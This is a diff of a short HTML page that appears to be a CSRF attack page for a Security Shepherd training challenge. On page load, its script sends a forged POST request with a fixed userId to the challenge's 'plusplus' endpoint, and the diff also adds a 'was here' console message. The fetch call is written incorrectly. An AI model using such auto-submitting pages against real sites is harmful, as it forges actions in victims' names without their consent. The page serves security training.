@@ -1,10 +1,24 @@
 <html>
 <head>
 <script>
-	fetch("https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus?userId=9b7be4e50d9a4e207f266bef3f4c6ffbf785ac2d", method: 'POST')
+	fetch({
+	  url: 'https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus?userId=9b7be4e50d9a4e207f266bef3f4c6ffbf785ac2d',
+	  method: 'POST',
+	  mode: "cors",
+	  credentials: 'same-origin' 
+	})
+	.then(response => response)
+	.then(result => {
+	  console.log("result");
+	  console.log('Success:', result.text().then( a => console.log(a)));
+	})
+	.catch(error => {
+	  console.error('Error:', error);
+	});
 </script>
 </head>
 <body>
 <h3>Perhaps this time is the right one. Or the next one </h3>
+	<script>console.log("Briomkez was here"); </script>
 </body>
 </html>
